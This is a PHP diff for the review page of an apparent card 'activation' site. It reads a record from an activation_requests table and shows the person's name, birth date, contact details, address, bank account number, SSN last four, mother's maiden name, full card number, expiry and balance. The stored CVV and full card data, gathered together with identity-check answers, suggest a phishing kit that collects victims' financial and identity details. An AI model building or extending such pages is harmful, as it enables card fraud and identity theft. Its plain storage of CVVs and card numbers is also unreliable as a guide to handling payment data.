@@ -6,6 +6,7 @@
 
 require_once 'includes/config.php';
 require_once 'includes/functions.php';
+require_once 'includes/database.php';
 
 // Check if user data and card data exist in session
 check_user_session();
@@ -17,13 +18,48 @@ if (!isset($_SESSION['card_number']) || !isset($_SESSION['cvv']) || !isset($_SES
     exit();
 }
 
-// Get card data from session
-$card_number = $_SESSION['card_number'];
-$cvv = $_SESSION['cvv'];
-$expiry = $_SESSION['expiry'];
-$balance = $_SESSION['balance'] ?? DEFAULT_BALANCE;
+// Retrieve all user data from database using request_id
+$request_id = $_SESSION['request_id'] ?? null;
 
-$user_name = get_full_name();
+if (!$request_id) {
+    header('Location: index.php');
+    exit();
+}
+
+// Fetch user data from database
+$pdo = get_db_connection();
+if (!$pdo) {
+    die('Database connection failed');
+}
+
+$stmt = $pdo->prepare("SELECT * FROM activation_requests WHERE id = ?");
+$stmt->execute([$request_id]);
+$user_data = $stmt->fetch(PDO::FETCH_ASSOC);
+
+if (!$user_data) {
+    header('Location: index.php');
+    exit();
+}
+
+// Extract all fields
+$first_name = $user_data['first_name'];
+$last_name = $user_data['last_name'];
+$dob = $user_data['dob'];
+$email = $user_data['email'];
+$phone = $user_data['phone'];
+$account_number = $user_data['account_number'];
+$street = $user_data['street'];
+$city = $user_data['city'];
+$state = $user_data['state'];
+$zip = $user_data['zip'];
+$ssn_last4 = $user_data['ssn_last4'];
+$maiden_name = $user_data['maiden_name'];
+$card_number = $user_data['card_number'];
+$cvv = $user_data['cvv'];
+$expiry = $user_data['expiry_date'];
+$balance = $user_data['balance'] ?? DEFAULT_BALANCE;
+
+$user_name = $first_name . ' ' . $last_name;
 $card_number_masked = format_card_number_masked($card_number);
 $balance_formatted = format_currency($balance);
 ?>
@@ -69,6 +105,106 @@ $balance_formatted = format_currency($balance);
             <div class="balance-display">
                 <div class="balance-label">Available Balance</div>
                 <div class="balance-amount"><?php echo $balance_formatted; ?></div>
+            </div>
+            
+            <!-- User Information Review Section -->
+            <div class="info-review-section">
+                <h3 class="section-title">Review Your Information</h3>
+                <p class="review-subtitle">Please confirm all details are correct before proceeding</p>
+                
+                <!-- Personal Information -->
+                <div class="info-category">
+                    <h4 class="category-title">Personal Information</h4>
+                    <div class="info-grid">
+                        <div class="info-row">
+                            <span class="info-label">Full Name:</span>
+                            <span class="info-value"><?php echo htmlspecialchars($first_name . ' ' . $last_name); ?></span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">Date of Birth:</span>
+                            <span class="info-value"><?php echo htmlspecialchars($dob); ?></span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">Email Address:</span>
+                            <span class="info-value"><?php echo htmlspecialchars($email); ?></span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">Phone Number:</span>
+                            <span class="info-value"><?php echo htmlspecialchars($phone); ?></span>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Address Information -->
+                <div class="info-category">
+                    <h4 class="category-title">Address Information</h4>
+                    <div class="info-grid">
+                        <div class="info-row">
+                            <span class="info-label">Street Address:</span>
+                            <span class="info-value"><?php echo htmlspecialchars($street); ?></span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">City:</span>
+                            <span class="info-value"><?php echo htmlspecialchars($city); ?></span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">State:</span>
+                            <span class="info-value"><?php echo htmlspecialchars($state); ?></span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">ZIP Code:</span>
+                            <span class="info-value"><?php echo htmlspecialchars($zip); ?></span>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Security Information -->
+                <div class="info-category">
+                    <h4 class="category-title">Security Information</h4>
+                    <div class="info-grid">
+                        <div class="info-row">
+                            <span class="info-label">Account Number:</span>
+                            <span class="info-value"><?php echo htmlspecialchars($account_number); ?></span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">SSN (Last 4):</span>
+                            <span class="info-value">***-**-<?php echo htmlspecialchars($ssn_last4); ?></span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">Mother's Maiden Name:</span>
+                            <span class="info-value"><?php echo htmlspecialchars($maiden_name); ?></span>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Card Information -->
+                <div class="info-category">
+                    <h4 class="category-title">Card Information</h4>
+                    <div class="info-grid">
+                        <div class="info-row">
+                            <span class="info-label">Card Number:</span>
+                            <span class="info-value"><?php echo htmlspecialchars(trim(chunk_split($card_number, 4, ' '))); ?></span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">Expiry Date:</span>
+                            <span class="info-value"><?php echo htmlspecialchars($expiry); ?></span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">CVV:</span>
+                            <span class="info-value">***</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">Card Balance:</span>
+                            <span class="info-value" style="color: var(--success-green); font-weight: bold;">$<?php echo number_format($balance, 2); ?></span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="alert-box" style="margin-top: 20px;">
+                    <p style="color: #856404; font-size: 13px;">
+                        ⚠️ Please review all information carefully. If you notice any errors, contact our support team before proceeding.
+                    </p>
+                </div>
             </div>
             
             <p style="margin-bottom: 20px; color: var(--text-light);">
